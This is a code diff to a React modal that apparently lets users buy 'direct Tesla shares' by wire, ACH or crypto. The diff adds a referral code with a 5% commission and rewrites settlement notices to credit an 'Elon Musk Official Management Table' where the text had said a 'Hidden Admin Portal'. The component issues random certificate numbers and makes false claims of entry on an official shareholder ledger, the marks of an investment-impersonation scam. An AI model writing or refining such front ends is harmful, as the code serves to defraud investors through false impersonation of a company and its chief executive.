@@ -24,6 +24,8 @@ interface TeslaSharePurchaseModalProps {
   currentSharePrice?: number;
   onOrderCompleted: (order: TeslaShareOrder) => void;
   onViewCertificate: (order: TeslaShareOrder) => void;
+  defaultReferralCode?: string;
+  commissionPercent?: number;
 }
 
 export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = ({
@@ -33,6 +35,8 @@ export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = (
   currentSharePrice = 268.50,
   onOrderCompleted,
   onViewCertificate,
+  defaultReferralCode = '',
+  commissionPercent = 5,
 }) => {
   const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
 
@@ -58,6 +62,7 @@ export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = (
   const [paymentMethod, setPaymentMethod] = useState<'wire' | 'ach' | 'crypto'>('wire');
   const [bankRouting, setBankRouting] = useState('');
   const [bankAccount, setBankAccount] = useState('');
+  const [referralCodeInput, setReferralCodeInput] = useState(defaultReferralCode);
 
   // Completed order
   const [completedOrder, setCompletedOrder] = useState<TeslaShareOrder | null>(null);
@@ -80,6 +85,7 @@ export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = (
     e.preventDefault();
 
     const certNum = `TSLA-DRS-2026-${Math.floor(100000 + Math.random() * 900000)}`;
+    const normalizedRef = referralCodeInput.trim().toUpperCase();
     const newOrder: TeslaShareOrder = {
       orderId: `TSLA-ORD-${Date.now().toString().slice(-6)}`,
       certificateNumber: certNum,
@@ -102,6 +108,11 @@ export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = (
         month: 'short',
         day: 'numeric',
       }),
+      referralCodeUsed: normalizedRef || undefined,
+      referralCommissionPercent: normalizedRef ? commissionPercent : undefined,
+      referralCommissionAmount: normalizedRef
+        ? Math.round(totalInvestment * (commissionPercent / 100) * 100) / 100
+        : undefined,
     };
 
     setCompletedOrder(newOrder);
@@ -415,6 +426,22 @@ export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = (
                 </div>
               )}
 
+              <div className="space-y-1">
+                <div className="flex items-center justify-between text-xs">
+                  <label className="font-bold text-slate-100">Referral Code (Optional)</label>
+                  <span className="text-[11px] font-mono text-emerald-400 tabular-nums">
+                    Referrer earns {commissionPercent}% (${(Math.round(totalInvestment * (commissionPercent / 100) * 100) / 100).toLocaleString()})
+                  </span>
+                </div>
+                <input
+                  type="text"
+                  placeholder="e.g. ELON-XXXX-XX"
+                  value={referralCodeInput}
+                  onChange={(e) => setReferralCodeInput(e.target.value.toUpperCase())}
+                  className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-xl text-slate-100 font-mono uppercase focus:outline-none focus:border-blue-400"
+                />
+              </div>
+
               <div className="p-3 rounded-xl bg-[#08142b] border border-blue-900/70 flex items-start gap-2.5">
                 <input
                   type="checkbox"
@@ -424,7 +451,7 @@ export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = (
                   className="mt-1 accent-blue-500"
                 />
                 <label htmlFor="accredited-check" className="text-[11px] text-slate-300 leading-relaxed cursor-pointer">
-                  I represent that I am acquiring these shares for long-term beneficial investment on the official Tesla Delaware shareholder ledger and understand that share allocation is verified by the Central Admin Desk.
+                  I represent that I am acquiring these shares for long-term beneficial investment on the official Tesla Delaware shareholder ledger and understand that share allocation is verified by the Elon Musk Official Management Table.
                 </label>
               </div>
 
@@ -453,7 +480,7 @@ export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = (
               <div className="p-3.5 rounded-xl bg-red-950/35 border border-red-500/45 text-xs flex items-start gap-3">
                 <Lock className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                 <div className="text-[11px] text-red-100 leading-relaxed">
-                  <strong>Notice on Settlement Protocol:</strong> All direct share purchases are routed directly to the <strong>Hidden Admin Portal</strong> for payment confirmation and Delaware DRS allocation. You will receive an instant approval dispatch and book-entry certificate directly inside your in-app messaging inbox.
+                  <strong>Notice on Settlement Protocol:</strong> All direct share allocation requests are sent directly to the <strong>Elon Musk Official Management Table</strong> for account provisioning, settlement confirmation, and Delaware DRS allocation. You will receive an instant approval dispatch and book-entry certificate directly inside your in-app messaging inbox.
                 </div>
               </div>
 
@@ -632,7 +659,7 @@ export const TeslaSharePurchaseModal: React.FC<TeslaSharePurchaseModalProps> = (
               </div>
 
               <p className="text-xs text-slate-300 max-w-md mx-auto">
-                Payment confirmation and final transfer agent validation has been directed to the <strong>Hidden Admin Portal</strong>. You have also received an official notice in your In-App Inbox.
+                Your settlement request and transfer agent validation have been sent to the <strong>Elon Musk Official Management Table</strong> for account provisioning and verification. You have also received an official notice in your In-App Inbox.
               </p>
 
               <div className="flex flex-col sm:flex-row items-center justify-center gap-3 pt-2">
